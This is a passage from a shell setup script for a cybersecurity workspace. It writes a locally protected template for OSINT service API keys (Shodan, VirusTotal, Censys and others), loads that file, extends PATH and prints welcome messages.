        echo "📝 Create API keys file at: $config_file"
        echo "Example format:"
        echo "export SHODAN_API_KEY='your_key_here'"
        echo "export VIRUSTOTAL_API_KEY='your_key_here'"
    fi
}

# Create API keys template
setup_api_keys() {
    local config_dir="$HOME/.config/cybersec"
    local config_file="$config_dir/api_keys.env"
    
    mkdir -p "$config_dir"
    
    if [ ! -f "$config_file" ]; then
        cat > "$config_file" << 'EOF'
# Cybersecurity API Keys Configuration
# ===================================
# 
# Uncomment and add your API keys below:

# Shodan (Internet-connected device search)
# export SHODAN_API_KEY="your_shodan_api_key_here"

# VirusTotal (File/URL analysis)
# export VIRUSTOTAL_API_KEY="your_virustotal_api_key_here"

# SecurityTrails (DNS/IP intelligence)
# export SECURITYTRAILS_API_KEY="your_securitytrails_api_key_here"

# Censys (Internet scanning)
# export CENSYS_API_ID="your_censys_api_id_here"
# export CENSYS_API_SECRET="your_censys_api_secret_here"

# GitHub (for tool downloads)
# export GITHUB_TOKEN="your_github_token_here"

# Additional APIs
# export CUSTOM_API_KEY="your_custom_api_key_here"

EOF
        chmod 600 "$config_file"
        echo "✅ API keys template created at: $config_file"
        echo "📝 Edit the file to add your API keys"
    else
        echo "✅ API keys file already exists at: $config_file"
    fi
}

# =====================================
# LOAD CONFIGURATION
# =====================================

# Load API keys if available
[ -f "$HOME/.config/cybersec/api_keys.env" ] && source "$HOME/.config/cybersec/api_keys.env"

# Add custom tools to PATH
export PATH=$PATH:~/cybersec/tools:~/go/bin:/usr/local/go/bin

# =====================================
# COMPLETION
# =====================================

echo "🛡️ Cybersecurity Environment Loaded!"
echo "📖 Type 'cybersec-help' for detailed usage information"
echo "⚙️ Run 'setup-cybersec' to initialize your workspace"
echo ""
